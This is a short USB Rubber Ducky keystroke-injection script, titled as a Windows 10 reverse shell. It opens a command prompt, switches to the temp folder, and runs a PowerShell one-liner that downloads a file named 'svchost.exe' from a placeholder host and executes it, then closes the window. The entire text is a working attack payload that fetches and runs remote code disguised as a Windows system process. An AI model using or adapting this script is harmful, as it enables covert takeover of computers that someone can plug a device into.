# Windows10_USBRubberDucky_ReversheShell

REM Opens console, downloads a File svchost.exe and execute it
DELAY 500
CONTROL ESCAPE
DELAY 100
STRING cmd.exe
DELAY 100
ENTER
DELAY 400
STRING cd %TEMP%
DELAY 100
ENTER
DELAY 100
STRING powershell (new-object System.Net.WebClient).DownloadFile('http://www.example.com/svchost.exe','%TEMP%\svchost.exe'); Start-Process "%TEMP%\svchost.exe"
ENTER
DELAY 100
STRING exit
DELAY 100
ENTER
